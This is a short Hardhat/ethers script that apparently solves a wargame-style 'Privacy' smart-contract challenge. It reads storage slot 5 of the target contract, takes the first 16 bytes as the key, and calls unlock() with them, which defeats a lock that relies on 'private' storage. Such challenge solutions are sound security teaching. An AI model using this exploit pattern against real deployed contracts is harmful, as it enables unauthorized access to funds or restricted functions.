const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const privacyAddress = addresses[scriptName];
    const privacyContract = await ethers.getContractAt("IPrivacy", privacyAddress);

    let bytesData = await ethers.provider.getStorageAt(privacyAddress, 5)
    console.log(bytesData)
    
    let password = bytesData.substring(0, 34);
    console.log(password)

    const txUnlock = await privacyContract.unlock(password);

    console.log('----------End----------', txUnlock.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
  